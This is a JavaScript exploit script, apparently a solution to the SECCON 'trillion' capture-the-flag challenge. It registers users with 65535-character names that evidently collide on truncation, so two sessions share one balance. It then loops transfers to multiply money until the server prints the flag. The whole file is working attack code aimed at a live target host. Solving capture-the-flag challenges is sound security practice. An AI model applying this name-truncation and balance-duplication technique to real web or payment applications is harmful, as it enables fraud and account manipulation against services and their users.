import { randomBytes } from "crypto";

const randomId = () => randomBytes(16).toString("hex");
// const baseUrl = "http://localhost:3000";
const baseUrl = "http://trillion.seccon.games:3000";

// Some helpers
const register = async (name) => {
	console.log("Registering", name);
	const res = await fetch(`${baseUrl}/api/register`, {
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify({ name }),
	});
	// Return the cookie
	console.log(await res.json());
	return res.headers.get("set-cookie").split(";")[0];
};

const checkBalance = async (cookie) => {
	const res = await fetch(`${baseUrl}/api/me`, {
		headers: { cookie },
	});

	const data = await res.json();
	if (data.flag) {
		console.log(data.flag);
		process.exit(0);
	}
	return data.balance;
};

const transfer = async (cookie, recipientName, amount) => {
	const res = await fetch(`${baseUrl}/api/transfer`, {
		method: "POST",
		headers: { "Content-Type": "application/json", cookie },
		body: JSON.stringify({ recipientName, amount }),
	});
	return res.json();
};

const prefix = randomId();
const personA = prefix + "a".repeat(65535 - prefix.length);
const personB = prefix + "b".repeat(65535 - prefix.length);

const personACookie = await register(personA);
const personBCookie1 = await register(personB);
const personBCookie2 = await register(personB + "2");

while (true) {
	const balanceA = await checkBalance(personACookie);
	console.log("A", balanceA);
	console.log(await transfer(personACookie, personB, balanceA));
	const balanceB1 = await checkBalance(personBCookie1);
	const balanceB2 = await checkBalance(personBCookie2);
	console.log("B1", balanceB1);
	console.log("B2", balanceB2);
	console.log(await transfer(personBCookie1, personA, balanceB1));
	console.log(await transfer(personBCookie2, personA, balanceB2));
}
